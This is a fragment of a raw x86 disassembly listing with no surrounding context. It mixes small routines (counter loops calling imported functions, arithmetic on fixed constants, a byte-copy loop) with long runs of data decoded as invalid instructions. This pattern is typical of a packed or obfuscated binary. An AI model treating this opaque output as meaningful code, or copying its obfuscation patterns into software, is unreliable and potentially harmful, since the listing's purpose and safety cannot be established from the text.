  41025b:	cmp    eax,0xf5007ef0
  410260:	aad    0x5c
  410262:	jo     0x41020c
  410264:	popa   
  410265:	call   0x597e:0x5ddf06ec
  41026c:	pop    ebx
  41026d:	(bad)  
  41026e:	cli    
  41026f:	add    al,0xbc
  410271:	int3   
  410272:	pushf  
  410273:	sbb    ebp,edx
  410275:	xor    cl,bh
  410277:	lods   eax,DWORD PTR ds:[esi]
  410278:	(bad)  
  410279:	(bad)  [ebx+0x19ff8269]
  41027f:	sbb    al,0x80
  410281:	cmc    
  410282:	cmp    DWORD PTR [ebx-0x60f0c9f8],esi
  410288:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410289:	fimul  DWORD PTR [esp+esi*4]
  41028c:	mov    edi,0xae3cd
  410291:	adc    BYTE PTR [ebx-0x2f],bh
  410294:	or     al,0x8b
  410296:	jne    0x410290
  410298:	mov    DWORD PTR ds:0x4337eb,0x5b5
  4102a2:	xor    eax,edx
  4102a4:	xor    esi,edx
  4102a6:	add    eax,ecx
  4102a8:	sub    DWORD PTR ds:0x43370f,0x433803
  4102b2:	add    esi,ecx
  4102b4:	imul   eax,esi
  4102b7:	jmp    0x41034e
  4102bc:	mov    DWORD PTR ds:0x433713,0x12
  4102c6:	cmp    DWORD PTR ds:0x433713,0x0
  4102cd:	je     0x410313
  4102d3:	cmp    DWORD PTR ds:0x433713,0x7
  4102da:	jne    0x4102eb
  4102e0:	push   0x1099
  4102e5:	call   DWORD PTR ds:0x412038
  4102eb:	cmp    DWORD PTR ds:0x433713,0x8
  4102f2:	jne    0x410303
  4102f8:	mov    eax,ds:0x433713
  4102fd:	dec    eax
  4102fe:	mov    ds:0x433713,eax
  410303:	mov    eax,ds:0x433713
  410308:	dec    eax
  410309:	mov    ds:0x433713,eax
  41030e:	jmp    0x4102c6
  410313:	mov    eax,DWORD PTR [ebp+0xc]
  410316:	mov    eax,DWORD PTR [eax+0x78]
  410319:	mov    DWORD PTR [ebp+0xc],eax
  41031c:	mov    eax,DWORD PTR [ebp-0x4]
  41031f:	mov    esi,DWORD PTR [ebp-0x8]
  410322:	xor    eax,edx
  410324:	xor    esi,edx
  410326:	add    eax,ecx
  410328:	add    esi,ecx
  41032a:	imul   eax,esi
  41032d:	mov    esi,DWORD PTR [ebp+0xc]
  410330:	cmp    esi,eax
  410332:	mov    eax,DWORD PTR [ebp-0x4]
  410335:	je     0x40ffbc
  41033b:	xor    eax,edx
  41033d:	add    eax,ecx
  41033f:	mov    ecx,DWORD PTR [ebp+0xc]
  410342:	imul   eax,ecx
  410345:	add    eax,DWORD PTR [ebp+0x8]
  410348:	mov    DWORD PTR [ebp+0xc],eax
  41034b:	mov    eax,DWORD PTR [ebp+0xc]
  41034e:	pop    esi
  41034f:	leave  
  410350:	ret    0x8
  410353:	push   ebp
  410354:	mov    ebp,esp
  410356:	push   ecx
  410357:	and    DWORD PTR ds:0x43370f,0x0
  410361:	jmp    0x410371
  410366:	mov    eax,ds:0x43370f
  41036b:	inc    eax
  41036c:	mov    ds:0x43370f,eax
  410371:	cmp    DWORD PTR ds:0x43370f,0x11
  410378:	jae    0x4103b4
  41037e:	cmp    DWORD PTR ds:0x43370f,0x9
  410385:	jne    0x410391
  41038b:	call   DWORD PTR ds:0x41203c
  410391:	cmp    DWORD PTR ds:0x43370f,0x8
  410398:	jne    0x4103a9
  41039e:	mov    eax,ds:0x43370f
  4103a3:	inc    eax
  4103a4:	mov    ds:0x43370f,eax
  4103a9:	jmp    0x410366
  4103ae:	xor    DWORD PTR ds:0x43371f,edi
  4103b4:	push   ecx
  4103b5:	add    DWORD PTR ds:0x43377f,0x4337bf
  4103bf:	mov    eax,0xf89c8531
  4103c4:	or     edx,DWORD PTR ds:0x433767
  4103ca:	mov    DWORD PTR [ebp-0x8],eax
  4103cd:	jmp    0x41065e
  4103d2:	jne    0x4103d9
  4103d4:	dec    eax
  4103d5:	cs push 0xee457173
  4103db:	xchg   edx,eax
  4103dc:	or     DWORD PTR [ebp-0x73c797c6],esp
  4103e2:	and    eax,0xea7e7ebd
  4103e7:	jl     0x410467
  4103e9:	jle    0x41042d
  4103eb:	push   0xfffffff9
  4103ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4103ee:	outs   dx,BYTE PTR ds:[esi]
  4103ef:	and    DWORD PTR [ebp-0x77],esi
  4103f2:	(bad)  
  4103f4:	mov    ch,0x30
  4103f6:	hlt    
  4103f7:	mov    eax,ds:0xe2d5296d
  4103fc:	mov    bh,BYTE PTR [edx-0x1317b0f4]
  410402:	loopne 0x4103a6
  410404:	ss ds push 0x53ed3d86
  41040b:	inc    ebx
  41040c:	add    edx,esp
  41040e:	xor    edi,DWORD PTR [esi+ecx*4-0x7d]
  410412:	out    dx,eax
  410413:	(bad)  
  410414:	out    0xc2,eax
  410416:	jle    0x41041f
  410418:	mov    ebx,0x4a48e44a
  41041d:	cmp    al,0xd5
  41041f:	les    esi,FWORD PTR [ebp+0x27d7bb86]
  410425:	push   ebx
  410426:	mov    ds:0xce516166,al
  41042b:	push   ecx
  41042c:	fisttp QWORD PTR [edi+0x23ee3f73]
  410432:	add    al,BYTE PTR [edx+eiz*2]
  410435:	add    ebp,ecx
  410437:	cld    
  410438:	nop
  410439:	rcr    DWORD PTR [edi-0x40f18b],1
  41043f:	or     eax,0xf697a4f5
  410444:	mov    ds:0x532e4387,al
  410449:	enter  0xc2b3,0x56
  41044d:	or     BYTE PTR [eax+ebx*2],cl
  410450:	sti    
  410451:	sub    esp,DWORD PTR [esi+0x3c69cf32]
  410457:	or     eax,0x1ac0f9b1
  41045c:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  41045e:	icebp  
  41045f:	and    BYTE PTR [ebp+0x69],bh
  410462:	and    ch,BYTE PTR [ebx]
  410464:	lods   al,BYTE PTR ds:[esi]
  410465:	sub    al,0x36
  410467:	dec    ecx
  410468:	(bad)  
  410469:	jle    0x410486
  41046b:	clc    
  41046c:	mov    edx,0xb589d2c8
  410471:	mov    cl,0x3d
  410473:	add    DWORD PTR [esi+0x653619af],esi
  410479:	cmp    eax,DWORD PTR [ebx+esi*1+0x46]
  41047d:	scas   eax,DWORD PTR es:[edi]
  41047e:	(bad)  
  41047f:	fwait
  410480:	hlt    
  410481:	arpl   WORD PTR [ebx+0x4d7a6a44],cx
  410487:	add    dl,dl
  410489:	adc    eax,DWORD PTR [esi-0x518b687e]
  41048f:	leave  
  410490:	cwde   
  410491:	loope  0x4104ec
  410493:	push   ecx
  410494:	mov    esi,0xd03a36f3
  410499:	retf   
  41049a:	mov    dl,BYTE PTR [ebp+0x12]
  41049d:	dec    ebp
  41049e:	lds    edi,FWORD PTR [eax-0x15a3b22a]
  4104a4:	jp     0x41049d
  4104a6:	sub    DWORD PTR [esi],ebx
  4104a8:	add    bl,BYTE PTR [edx-0x38]
  4104ab:	in     al,dx
  4104ac:	(bad)  [ecx]
  4104ae:	xor    BYTE PTR [eax],al
  4104b0:	dec    ebx
  4104b1:	shl    ebx,1
  4104b3:	push   edi
  4104b4:	daa    
  4104b5:	aaa    
  4104b6:	sub    eax,0x8
  4104b9:	pop    edi
  4104ba:	push   esp
  4104bb:	xchg   edi,eax
  4104bc:	mov    esi,0xc83a232
  4104c1:	jmp    0x4104c4
  4104c3:	mov    al,0xf2
  4104c5:	pushf  
  4104c6:	pusha  
  4104c7:	xor    dl,BYTE PTR [ebx-0x7b788fd4]
  4104cd:	xchg   DWORD PTR [ecx-0x6],edi
  4104d0:	lods   al,BYTE PTR ds:[esi]
  4104d1:	fist   DWORD PTR [edi-0x5]
  4104d4:	mov    ah,0x73
  4104d6:	sbb    ebp,DWORD PTR [eax-0x1]
  4104d9:	daa    
  4104da:	aam    0xb9
  4104dc:	sbb    eax,0xc884e937
  4104e1:	(bad)  
  4104e2:	clc    
  4104e3:	in     al,0xbe
  4104e5:	xor    BYTE PTR [edi],dh
  4104e7:	inc    esi
  4104e8:	ins    WORD PTR es:[edi],dx
  4104ea:	popa   
  4104eb:	inc    edx
  4104ec:	mov    ebx,0x5a1edb04
  4104f1:	dec    edx
  4104f2:	(bad)  
  4104f3:	bound  eax,QWORD PTR cs:[ebp+0x23]
  4104f7:	xor    eax,0xa5f9559c
  4104fc:	xchg   ebx,eax
  4104fd:	xchg   BYTE PTR [esi+0x28],bl
  410500:	neg    BYTE PTR [ecx]
  410502:	aam    0xbb
  410504:	out    0x8d,eax
  410506:	test   DWORD PTR [ebp+0x5c61a73d],0xee980479
  410510:	xchg   ecx,edi
  410512:	push   ds
  410513:	aam    0x56
  410515:	push   ebx
  410516:	and    DWORD PTR [edx],eax
  410518:	call   0x37d7:0x30a01d7f
  41051f:	fld    TBYTE PTR [edx+0x4fade60]
  410525:	mov    ebx,0x3f660dff
  41052a:	je     0x41058b
  41052c:	mov    edi,0xecf21b2a
  410531:	add    ecx,DWORD PTR [eax+0x129b78cf]
  410537:	or     ebx,esi
  410539:	rcr    BYTE PTR [eax],cl
  41053b:	stos   DWORD PTR es:[edi],eax
  41053c:	aad    0x11
  41053e:	ss ds test ch,ah
  410542:	shl    esp,cl
  410544:	(bad)  
  410545:	rcr    cl,cl
  410547:	lea    esi,[edx+0x3f429cbb]
  41054d:	jmp    0x41056f
  41054f:	popf   
  410550:	inc    edx
  410551:	rcl    BYTE PTR [esp+eiz*4+0x13],cl
  410555:	add    ebp,DWORD PTR [ecx-0x77]
  410558:	addr16 or al,0xc6
  41055b:	dec    ebp
  41055c:	mov    ebp,0x28d584a2
  410561:	in     eax,0x72
  410563:	loopne 0x4105b2
  410565:	fs xor al,0x7f
  410568:	add    eax,edi
  41056a:	sbb    BYTE PTR [ecx+esi*2],bl
  41056d:	test   BYTE PTR [esi],ah
  41056f:	cld    
  410570:	xor    eax,0x52cbbf99
  410575:	push   ss
  410576:	shr    ch,0x93
  410579:	sub    al,0x85
  41057c:	mov    ebx,0x4355a143
  410581:	xlat   BYTE PTR ds:[ebx]
  410582:	mov    edi,0xe531244a
  410587:	and    eax,DWORD PTR [edx]
  410589:	les    eax,FWORD PTR [eax]
  41058b:	sub    eax,DWORD PTR [eax-0x2a]
  41058e:	fcomp  QWORD PTR [edi+0x79]
  410591:	push   0x27
  410593:	neg    DWORD PTR [ebx+0xe]
  410596:	add    DWORD PTR [eax],esi
  410598:	out    0xb0,al
  41059a:	mov    ah,0x7
  41059c:	mov    edx,0x18775867
  4105a1:	(bad)  
  4105a2:	adc    BYTE PTR [ecx],al
  4105a4:	sbb    DWORD PTR [ebx-0x25],0x38
  4105a8:	stos   DWORD PTR es:[di],eax
  4105aa:	xchg   edi,eax
  4105ab:	in     eax,dx
  4105ac:	(bad)  
  4105ad:	mov    edx,0x81d2bc28
  4105b2:	fld    DWORD PTR gs:[edx-0x51]
  4105b6:	mov    esp,0x3a512232
  4105bb:	xchg   edx,eax
  4105bc:	or     DWORD PTR [edi-0x52],ebx
  4105bf:	(bad)  
  4105c0:	iret   
  4105c1:	pop    edi
  4105c2:	iret   
  4105c3:	fistp  DWORD PTR [ebp+0x35]
  4105c6:	mov    cl,0xcd
  4105c8:	or     eax,0x26d584c
  4105cd:	test   al,0xba
  4105cf:	mov    DWORD PTR [ebx+0x1030349b],esp
  4105d5:	adc    bl,BYTE PTR [edi*4-0x7873893f]
  4105dc:	push   edi
  4105dd:	lods   eax,DWORD PTR ds:[esi]
  4105de:	dec    ebx
  4105df:	mov    fs:0x5603dae8,al
  4105e5:	sbb    bl,BYTE PTR [ebx+0x565a91aa]
  4105eb:	dec    ebx
  4105ec:	push   eax
  4105ed:	push   esp
  4105ee:	dec    ebp
  4105ef:	sbb    BYTE PTR [edi-0x4f2e3064],bl
  4105f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4105f6:	push   edx
  4105f7:	pop    ds
  4105f8:	mov    al,0x6d
  4105fa:	div    BYTE PTR [esi-0x6]
  4105fd:	rol    DWORD PTR [edi],0xec
  410600:	push   DWORD PTR [esi+eax*4]
  410603:	std    
  410604:	adc    BYTE PTR ds:0x51b9f4f2,bl
  41060a:	xor    DWORD PTR es:0xb56407f4,eax
  410611:	pop    esp
  410612:	push   edx
  410613:	mov    dl,0x83
  410615:	sbb    DWORD PTR [edi-0x56],0x4015e20c
  41061c:	mov    WORD PTR [edx],?
  41061e:	outs   dx,BYTE PTR ds:[esi]
  41061f:	cmp    DWORD PTR [ebx-0x6b],esi
  410622:	mov    ebx,0xa2b9c41
  410627:	pop    ebp
  410628:	test   eax,0x3cff5e5f
  41062d:	(bad)  
  41062e:	mov    DWORD PTR [eax-0x4895e6b1],0x2307d047
  410638:	pusha  
  410639:	sbb    cl,bl
  41063b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41063c:	sub    DWORD PTR [edx-0x4],0x7be31a3a
  410643:	jo     0x41063c
  410645:	sub    esp,DWORD PTR [edi]
  410647:	mov    al,ds:0xeea31021
  41064c:	mov    al,0x2f
  41064e:	gs leave 
  410650:	xchg   esi,eax
  410651:	jne    0x41060a
  410653:	aas    
  410654:	pop    es
  410655:	sbb    cl,ch
  410657:	sub    esp,DWORD PTR [edi+ebx*1+0x3d4cb8b3]
  41065e:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  410665:	and    DWORD PTR ds:0x433713,0x0
  41066f:	mov    edx,DWORD PTR ds:0x433713
  410675:	inc    edx
  410676:	mov    DWORD PTR ds:0x433713,edx
  41067c:	cmp    DWORD PTR ds:0x433713,0x22
  410683:	jne    0x410692
  410689:	push   DWORD PTR [ebp-0x20]
  41068c:	call   DWORD PTR ds:0x412040
  410692:	cmp    DWORD PTR ds:0x433713,0x12
  410699:	jb     0x41066f
  41069f:	xor    edx,edx
  4106a1:	or     edx,DWORD PTR ds:0x4337ef
  4106a7:	sbb    edx,DWORD PTR ds:0x43371b
  4106ad:	mov    DWORD PTR ds:0x4337ef,edx
  4106b3:	mov    edx,DWORD PTR [ebp-0x8]
  4106b6:	mov    DWORD PTR ds:0x433733,0x17
  4106c0:	cmp    DWORD PTR ds:0x433733,0x0
  4106c7:	je     0x410724
  4106cd:	cmp    DWORD PTR ds:0x433733,0xc
  4106d4:	jne    0x4106ee
  4106da:	push   0x4338fc
  4106df:	push   DWORD PTR [ebp-0x1c]
  4106e2:	push   DWORD PTR [ebp-0x18]
  4106e5:	push   DWORD PTR [ebp-0x1c]
  4106e8:	call   DWORD PTR ds:0x4121e8
  4106ee:	cmp    DWORD PTR ds:0x433733,0xd
  4106f5:	jne    0x410708
  4106fb:	mov    ecx,DWORD PTR ds:0x433733
  410701:	dec    ecx
  410702:	mov    DWORD PTR ds:0x433733,ecx
  410708:	mov    ecx,DWORD PTR ds:0x433733
  41070e:	dec    ecx
  41070f:	mov    DWORD PTR ds:0x433733,ecx
  410715:	jmp    0x4106c0
  41071a:	mov    DWORD PTR ds:0x4337f3,0x1fcc
  410724:	push   esi
  410725:	xor    DWORD PTR ds:0x4337b7,ebx
  41072b:	mov    ecx,0x7510854
  410730:	sbb    DWORD PTR ds:0x433717,ecx
  410736:	xor    edx,ecx
  410738:	mov    esi,0x32729b
  41073d:	adc    DWORD PTR ds:0x433727,0x4337ab
  410747:	push   edi
  410748:	mov    edi,DWORD PTR [ebp+0x10]
  41074b:	add    edx,esi
  41074d:	cmp    edi,edx
  41074f:	je     0x410a59
  410755:	mov    edx,DWORD PTR [ebp-0x8]
  410758:	mov    eax,DWORD PTR [ebp-0x4]
  41075b:	xor    eax,ecx
  41075d:	mov    edi,0xffcd8d65
  410762:	sub    edi,eax
  410764:	add    edi,DWORD PTR [ebp+0x10]
  410767:	xor    edx,ecx
  410769:	add    edx,esi
  41076b:	cmp    edx,edi
  41076d:	ja     0x410a54
  410773:	push   ebx
  410774:	jmp    0x41077e
  410779:	mov    esi,0x32729b
  41077e:	mov    eax,DWORD PTR [ebp-0x8]
  410781:	mov    edi,DWORD PTR [ebp-0x4]
  410784:	xor    edi,ecx
  410786:	add    edi,esi
  410788:	mov    esi,DWORD PTR [ebp+0x8]
  41078b:	imul   edi,edx
  41078e:	mov    ebx,DWORD PTR [ebp+0xc]
  410791:	xor    eax,ecx
  410793:	add    eax,edx
  410795:	mov    al,BYTE PTR [ebx+eax*1+0x32729b]
  41079c:	mov    BYTE PTR [edi+esi*1],al
  41079f:	mov    eax,DWORD PTR [ebp-0x4]
  4107a2:	xor    eax,ecx
  4107a4:	lea    edx,[edx+eax*1+0x32729b]
  4107ab:	mov    eax,DWORD PTR [ebp-0x4]
  4107ae:	xor    eax,ecx
  4107b0:	mov    esi,0xffcd8d65
  4107b5:	sub    esi,eax
  4107b7:	add    esi,DWORD PTR [ebp+0x10]
  4107ba:	cmp    edx,esi
  4107bc:	jbe    0x410779
  4107c2:	pop    ebx
  4107c3:	jmp    0x410a54
  4107c8:	out    dx,eax
  4107c9:	adc    al,0x6b
  4107cb:	adc    esi,DWORD PTR [ecx+0x71]
  4107ce:	ja     0x4107c0
  4107d0:	or     DWORD PTR [eax],0x28
  4107d3:	icebp  
  4107d4:	mov    esp,0x91a7227a
  4107d9:	mov    ebx,0x7cea7e7e
  4107de:	jle    0x41085e
  4107e0:	jne    0x410854
  4107e2:	int    0xc7
  4107e4:	mov    esi,DWORD PTR [eax-0x1]
  4107e7:	inc    edx
  4107e8:	inc    eax
  4107e9:	aas    
  4107ea:	or     BYTE PTR [edi],ch
  4107ec:	and    BYTE PTR [eax],cl
  4107ee:	add    al,cl
  4107f0:	jnp    0x41081e
  4107f2:	xor    eax,0x437bf4ef
  4107f7:	xchg   edx,eax
  4107f8:	je     0x4107b4
  4107fa:	addr16 cld 
  4107fc:	(bad)
  4107ff:	cmc    
  410800:	shl    DWORD PTR [edx+0x1b],1
  410803:	push   esp
  410804:	fsubr  QWORD PTR [ecx]
  410806:	jecxz  0x4107bf
  410808:	dec    eax
  410809:	call   0xd2018ca2
  41080e:	dec    ebp
  41080f:	mov    al,ds:0xb8f11828
  410814:	je     0x410871
  410816:	loope  0x4107c5
  410818:	mov    ds:0xe263481c,al
  41081d:	sar    BYTE PTR [edi+edi*8-0x7c10d740],1
  410824:	fist   DWORD PTR [ebx-0x48]
  410827:	mov    WORD PTR [ebp+ebp*2-0x5339fa55],cs
  41082e:	std    
  41082f:	dec    esp
  410830:	inc    esi
  410831:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410832:	cmp    eax,DWORD PTR [ebx]
  410834:	jo     0x4107f2
  410836:	test   DWORD PTR [ebx],edi
  410838:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41083a:	dec    ecx
  41083b:	aam    0xca
  41083d:	repnz mov edi,0xb88574af
  410843:	adc    eax,0x87391ae9
  410848:	push   ds
  410849:	push   eax
  41084a:	cmp    DWORD PTR [ebx+0x3196570],edx
  410850:	scas   eax,DWORD PTR es:[edi]
  410851:	push   es
  410852:	repnz (bad) 
  410854:	mov    edx,0xbec8addb
  410859:	or     BYTE PTR [ecx+ebp*4-0x75],dl
  41085d:	cs mov esp,0x9d717931
  410863:	sahf   
  410864:	mov    bh,0x3d
  410866:	(bad)  
  410867:	adc    al,0x34
  410869:	cdq    
  41086a:	pop    eax
  41086b:	sub    al,BYTE PTR [edi]
  41086d:	jge    0x4108cf
  41086f:	xchg   BYTE PTR [edx+0x58],ch
  410872:	push   ss
  410873:	in     al,0x57
  410875:	xchg   BYTE PTR [edi+0x56827a6d],ah
  41087b:	jb     0x410869
  41087d:	loope  0x41087d
  41087f:	and    DWORD PTR [edx+esi*2-0x6f],esi
  410883:	dec    eax
  410884:	add    ch,0x2
  410887:	popa   
  410888:	fs addr16 hlt 
  41088b:	inc    ebp
  41088c:	lds    ebx,FWORD PTR [ebp-0x21a514ae]
  410892:	mov    DWORD PTR [ecx+edi*4],esp
  410895:	imul   ecx,DWORD PTR [ebx],0x5b21cc29
  41089b:	rcl    BYTE PTR [esi-0x5e16da91],cl
  4108a1:	test   BYTE PTR [edx+eiz*8+0x22a217cf],0x7
  4108a9:	push   0x43
  4108ab:	jbe    0x4108dc
  4108ad:	pop    ecx
  4108ae:	dec    esp
  4108af:	jg     0x41087a
  4108b1:	push   ebx
  4108b2:	leave  
  4108b3:	out    0xd7,al
  4108b5:	popf   
  4108b6:	cwde   
  4108b7:	sbb    eax,0x20aa98c1
  4108bc:	pop    es
  4108bd:	xor    dh,0x75
  4108c0:	xchg   esp,eax
  4108c1:	scas   eax,DWORD PTR es:[edi]
  4108c2:	idiv   DWORD PTR [edx-0xa]
  4108c5:	jmp    DWORD PTR [ebx-0x3b]
  4108c8:	xchg   edi,eax
  4108c9:	out    0xb2,eax
  4108cb:	stos   DWORD PTR es:[edi],eax
  4108cc:	outs   dx,DWORD PTR ds:[esi]
  4108cd:	(bad)  
  4108cf:	jmp    0xe7f9:0x6f329962
  4108d6:	in     al,dx
  4108d7:	jnp    0x4108d0
  4108d9:	adc    edi,DWORD PTR [eax+0x4607797f]
  4108df:	test   al,0x26
  4108e1:	lods   eax,DWORD PTR ds:[esi]
  4108e2:	sub    ch,BYTE PTR [ebx+0x75]
  4108e5:	pop    edx
  4108e6:	push   ebx
  4108e7:	pusha  
  4108e8:	xlat   BYTE PTR ds:[ebx]
  4108e9:	adc    al,ch
  4108eb:	in     eax,dx
  4108ec:	mov    bh,BYTE PTR [esi]
  4108ee:	cmp    BYTE PTR [edi-0xe],0x47
  4108f2:	inc    ecx
  4108f3:	sti    
  4108f4:	(bad)  
  4108f5:	mov    esp,0x2197f3ed
  4108fa:	les    ebp,FWORD PTR [ecx+0x25]
  4108fd:	pushf  
  4108fe:	fstp   TBYTE PTR [esi]
  410900:	dec    edi
  410901:	fisub  WORD PTR [ebx+0x2d]
  410904:	repz jp 0x4108ce
  410907:	imul   edi,edx,0x19258e20
  41090d:	cwde   
  41090e:	or     ah,BYTE PTR [ecx+0x72]
  410911:	xor    al,0x74
  410913:	or     DWORD PTR [ebx+0x1a],eax
  410916:	out    dx,al
  410917:	pusha  
  410918:	cmp    DWORD PTR [ebx+0x4a8d3daf],esp
  41091e:	pop    ebx
  41091f:	cld    
  410920:	aaa    
  410921:	cs jbe 0x410942
  410924:	cwde   
  410925:	jae    0x41090f
  410927:	jmp    FWORD PTR [ecx+esi*2+0x61e265bf]
  41092e:	stos   DWORD PTR es:[edi],eax
  41092f:	jge    0x410935
  410931:	dec    ebp
  410932:	inc    esp
  410933:	dec    esp
  410934:	sub    eax,0xd7178e67
  410939:	in     al,dx
  41093a:	outs   dx,DWORD PTR ds:[esi]
  41093b:	pop    eax
  41093c:	fbstp  TBYTE PTR ds:0xa9006c9d
  410942:	sbb    eax,edx
  410944:	std    
  410945:	(bad)  
  410946:	shl    DWORD PTR [eax+0x65b9faa3],1
  41094c:	inc    edi
  41094d:	call   0x5b9e:0x3acad26f
  410954:	inc    esi
  410955:	inc    edx
  410956:	xor    DWORD PTR [ebx+0x10],eax
  410959:	or     ecx,edi
  41095b:	ja     0x4109a0
  41095d:	jno    0x4109af
  41095f:	add    eax,0xe4cee324
  410964:	repz sub ch,0x31
  410968:	enter  0x8cbb,0xdd
  41096c:	dec    edi
  41096d:	mov    esi,0xa2f53b0c
  410972:	ds inc eax
  410974:	push   cs
  410975:	mov    edx,0xfb08289d
  41097a:	aaa    
  41097b:	cmp    BYTE PTR [edi],0x5c
  41097e:	add    edx,DWORD PTR [edx-0xf]
  410981:	mov    BYTE PTR [edi],bh
  410983:	and    DWORD PTR [ebx+0xcc09137],ecx
  410989:	test   ch,0xd5
  41098c:	das    
  41098d:	cld    
  41098e:	xor    DWORD PTR [ebx-0x68],esi
  410991:	mov    al,0xd7
  410993:	mov    al,0x44
  410995:	mov    DWORD PTR [esi+0x59],ecx
  410998:	jae    0x4109d2
  41099a:	popf   
  41099b:	clc    
  41099c:	sbb    al,0x71
  41099e:	mov    ds:0x5bcc97a6,eax
  4109a3:	vmwrite ebp,edi
  4109a6:	mov    edi,0x296b099
  4109ab:	stc    
  4109ac:	ins    BYTE PTR es:[edi],dx
  4109ad:	push   ss
  4109ae:	cmp    al,0xcc
  4109b0:	adc    edx,edx
  4109b2:	push   eax
  4109b3:	and    BYTE PTR fs:[ecx+0x34],0x34
  4109b8:	mov    ebp,0x88344b86
  4109bd:	hlt    
  4109be:	repz pop esp
  4109c0:	adc    cl,bl
  4109c2:	sub    al,0x31
  4109c4:	imul   esi,DWORD PTR [ebx-0x7d],0xd
  4109c8:	add    dh,BYTE PTR [ebp-0x24]
  4109cb:	scas   al,BYTE PTR es:[edi]
  4109cc:	mov    BYTE PTR [ebx-0x69],dh
  4109cf:	mov    bl,BYTE PTR [edi-0x52ef88c4]
  4109d5:	jbe    0x410995
  4109d7:	adc    al,0x88
  4109d9:	ss push eax
  4109db:	xchg   ebx,eax
  4109dc:	aas    
  4109dd:	mov    cl,0x52
  4109df:	add    eax,edi
  4109e1:	int    0x1b
  4109e3:	pop    edx
  4109e4:	jecxz  0x4109e7
  4109e6:	push   ds
  4109e7:	cmp    bl,BYTE PTR [ebx+0x65]
  4109ea:	dec    esi
  4109eb:	fcmove st,st(6)
  4109ed:	loop   0x410a63
  4109ef:	test   eax,0x6e37b9a2
  4109f4:	inc    edx
  4109f5:	outs   dx,DWORD PTR ds:[esi]
  4109f6:	sbb    bh,BYTE PTR [ebx+0x16]
  4109f9:	dec    edi
  4109fa:	icebp  
  4109fb:	pop    edi
  4109fc:	jp     0x4109d0
  4109fe:	inc    esi
  4109ff:	dec    ecx
  410a00:	popf   
  410a01:	push   edx
  410a02:	scas   al,BYTE PTR es:[edi]
  410a03:	sbb    eax,0xe044582
  410a08:	into   
  410a09:	pop    ecx
  410a0a:	xor    BYTE PTR [esi-0xf53a716],ch
  410a10:	mov    ah,BYTE PTR [esi-0x34]
  410a13:	lock sub eax,0xceb43b0b
  410a19:	mov    esp,0x554a996
  410a1e:	jl     0x4109e8
  410a20:	pop    esp
  410a21:	mov    ecx,0x7d5f8376
  410a26:	mov    cl,0xbf
  410a28:	dec    ebx
  410a29:	pop    esp
  410a2a:	(bad)  
  410a2b:	cmp    al,0x11
  410a2d:	clc    
  410a2e:	(bad)
  410a32:	scas   eax,DWORD PTR es:[edi]
  410a33:	fprem  
  410a35:	mov    ebx,0x69eb6572
  410a3a:	mov    ch,0x2
  410a3c:	fsubr  QWORD PTR es:[ebp-0x6e6cabd9]
  410a43:	in     eax,0xa6
  410a45:	ret    
  410a46:	unpckhps xmm4,XMMWORD PTR [ecx-0x7d]
  410a4a:	mov    eax,ds:0xce282360
  410a4f:	inc    ecx
  410a50:	push   ecx
  410a51:	jp     0x410a0d
  410a53:	dec    ebp
  410a54:	mov    eax,0xf89c8532
  410a59:	pop    edi
  410a5a:	pop    esi
  410a5b:	leave  
  410a5c:	ret    0xc
  410a5f:	push   ebp
  410a60:	mov    ebp,esp
  410a62:	mov    eax,DWORD PTR [ebp+0xc]
  410a65:	xor    edx,edx
  410a67:	mov    ecx,0x7264fca9
  410a6c:	div    ecx
  410a6e:	mov    ecx,DWORD PTR [ebp+0x10]
  410a71:	and    ecx,eax
  410a73:	or     ecx,0x81161d8f
  410a79:	mov    eax,ecx
  410a7b:	pop    ebp
  410a7c:	ret    0x18
  410a7f:	push   ebp
  410a80:	mov    ebp,esp
  410a82:	sub    esp,0x58
  410a85:	xor    DWORD PTR ds:0x4337e7,ecx
  410a8b:	mov    ecx,DWORD PTR [ebp+0x8]
  410a8e:	movzx  eax,WORD PTR ds:0x4337bf
  410a95:	sbb    eax,DWORD PTR ds:0x433843
  410a9b:	mov    ds:0x4337bf,eax
  410aa0:	mov    eax,0x8a3c
  410aa5:	xor    ax,WORD PTR [ecx+0x20]
  410aa9:	and    DWORD PTR ds:0x4337b7,0x4337ff
  410ab3:	mov    ecx,0x3b02
  410ab8:	add    ax,cx
  410abb:	and    DWORD PTR ds:0x4337af,0x7f6b
  410ac5:	movzx  eax,ax
  410ac8:	xor    DWORD PTR ds:0x433767,0x6006
  410ad2:	mov    DWORD PTR [ebp-0xc],eax
  410ad5:	mov    BYTE PTR [ebp-0x1],0x7f
  410ad9:	adc    ecx,0x1b78
  410adf:	lea    eax,[ebp-0x1]
  410ae2:	mov    DWORD PTR [ebp-0x10],eax
  410ae5:	adc    ecx,DWORD PTR ds:0x4337f7
  410aeb:	mov    al,BYTE PTR [ebp-0x1]
  410aee:	mov    ecx,DWORD PTR [ebp-0x10]
  410af1:	xor    al,0x46
  410af3:	sub    al,0x38
  410af5:	adc    DWORD PTR ds:0x43372b,0x433737
  410aff:	mov    BYTE PTR [ecx],al
  410b01:	xor    eax,eax
  410b03:	xor    eax,DWORD PTR ds:0x43372b
  410b09:	sbb    DWORD PTR ds:0x433773,eax
  410b0f:	jmp    0x410cab
  410b14:	add    DWORD PTR [ecx-0x1ca338a4],eax
  410b1a:	mov    eax,ds:0xb67bce41
  410b1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b20:	ins    DWORD PTR es:[edi],dx
  410b21:	(bad)  
  410b22:	mov    bl,0x1e
  410b24:	or     eax,0xf17e7e46
  410b29:	jg     0x410ba9
  410b2b:	jle    0x410b3d
  410b2d:	sbb    BYTE PTR [ebx+0x23],ch
  410b30:	arpl   cx,di
  410b32:	jb     0x410b1f
  410b34:	jmp    0x410bb0
  410b36:	cs call 0x26d:0x8b4c0438
  410b3e:	in     eax,dx
  410b3f:	or     al,0x27
  410b41:	or     cl,BYTE PTR [ebx-0x33]
  410b44:	mov    edx,eax
  410b46:	jmp    0x6cf:0xe2a8b515
  410b4d:	or     eax,0x9075224f
  410b52:	cli    
  410b53:	inc    edx
  410b54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b55:	jle    0x410ba2
